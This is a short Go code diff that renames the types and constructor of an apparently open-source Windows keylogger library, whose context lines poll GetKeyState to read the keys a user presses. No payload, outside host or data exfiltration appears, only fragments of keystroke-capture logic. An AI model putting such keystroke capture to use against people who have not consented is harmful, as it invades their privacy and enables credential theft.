@@ -22,20 +22,20 @@ var (
 	procGetKeyState           = moduser32.NewProc("GetKeyState")
 )
 
-// NewKeyloggerWindows creates a new keylogger depending on
+// NewKeyLogger creates a new keylogger depending on
 // the platform we are running on (currently only Windows
 // is supported)
-func NewKeyloggerWindows() KeyLogger {
-	return &KeyloggerWindows{}
+func NewKeyLogger() KeyLogger {
+	return &KeyLoggerWindows{}
 }
 
-// KeyloggerWindows represents the keylogger
-type KeyloggerWindows struct {
+// KeyLoggerWindows represents the keylogger
+type KeyLoggerWindows struct {
 	lastKey int
 }
 
 // GetKey gets the current entered key by the user, if there is any
-func (kl *KeyloggerWindows) GetKey() Key {
+func (kl *KeyLoggerWindows) GetKey() Key {
 	activeKey := 0
 	var keyState uint16
 
@@ -64,7 +64,7 @@ func (kl *KeyloggerWindows) GetKey() Key {
 
 // ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
 // That struct contains the Rune for the key
-func (kl KeyloggerWindows) ParseKeycode(keyCode int, keyState uint16) Key {
+func (kl KeyLoggerWindows) ParseKeycode(keyCode int, keyState uint16) Key {
 	key := Key{Empty: false, Keycode: keyCode}
 
 	// Only one rune has to fit in
